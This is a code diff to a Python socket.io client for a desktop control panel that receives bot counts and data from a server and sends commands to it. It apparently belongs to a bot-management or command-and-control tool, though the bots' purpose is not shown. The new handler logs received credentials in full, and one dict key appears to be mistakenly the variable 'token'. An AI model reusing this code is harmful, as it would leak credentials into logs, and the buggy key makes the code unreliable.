@@ -1,4 +1,4 @@
-from PySide6.QtCore import QObject, Signal
+from PySide6.QtCore import QObject, Signal,QSettings
 import socketio
 
 from core.util import PattayaPanelUtil
@@ -12,17 +12,23 @@ class SocketIOClient(QObject):
     connected_to_server = Signal()
     disconnected_to_server = Signal()
     panel_received_server_heartbeat = Signal(str)
+    panel_received_username = Signal(str)
+
+    
 
     def __init__(self, url = '', namespace = ''):
         super().__init__()
         self.url = url
         self.namespace = namespace
+        self.panel_token = QSettings("unknownclub.net", "Pattaya").value('token')
         self._bot_len = 0
         self.socket_io = socketio.Client()
         self.socket_io.on('connect', self._on_connect)
         self.socket_io.on('disconnect', self._on_disconnect)
-        self.socket_io.on('panel_received_bot_data', self._panel_received_bot_data)
-        self.socket_io.on('panel_received_server_heartbeat', self._panel_received_server_heartbeat)
+        self.socket_io.on(f'{self.panel_token}_panel_received_bot_data', self._panel_received_bot_data)
+        self.socket_io.on(f'{self.panel_token}_panel_received_username', self._panel_received_username)
+        self.socket_io.on(f'all_panel_received_bot_data', self._panel_received_bot_data)
+        self.socket_io.on(f'panel_received_server_heartbeat', self._panel_received_server_heartbeat)
 
 
     def start(self, url, token, namespace):
@@ -36,7 +42,7 @@ class SocketIOClient(QObject):
             PattayaPanelUtil.panel_log_error(f'{str(e)}')
 
         
-        self.socket_io.emit("panel_request_bot_data")
+        self.socket_io.emit("panel_request_bot_data", {token: self.panel_token})
 
 
     def send_command(self, event, data):
@@ -68,6 +74,11 @@ class SocketIOClient(QObject):
        self._bot_len = len(data['data'])
        self.panel_received_bot_count_data.emit(self._bot_len)
        PattayaPanelUtil.panel_log_info(f"Server emit bot data to panel: {str(self._bot_len)} bots")
+
+
+    def _panel_received_username(self, data):
+       self.panel_received_username.emit(data['username'])
+       PattayaPanelUtil.panel_log_info(f"Server emit credentials to panel: {data}")
         
 
     def _panel_received_server_heartbeat(self, data):
